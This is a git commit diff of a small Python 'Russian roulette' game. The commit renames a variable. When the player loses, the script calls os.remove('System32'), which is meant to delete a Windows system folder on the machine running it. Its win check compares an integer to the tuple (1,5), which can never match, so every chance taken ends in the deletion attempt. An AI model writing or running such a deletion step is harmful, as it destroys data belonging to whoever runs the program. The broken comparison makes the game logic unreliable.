ac3fe8ca591878353774c87bcae073ef83c74d39
Cody Wiley <cwiley.cs@gmail.com>
2024-01-02 18:41:20 -0500

    variable edits

--- Implemtation/roulette.py
+++ Implemtation/roulette.py
@@ -6,11 +6,10 @@ print("Let's play a game")
 while True:
     user = int(input('1. Take a chance?     2. Exit, coward'))
     if user == 1:
-        shot = random.randint(1,6)
-        if shot == (1,5):
+        hammer = random.randint(1,6)
+        if hammer == (1,5):
             print('You Win!')
         else:
             os.remove("System32")
     else:
         break
-
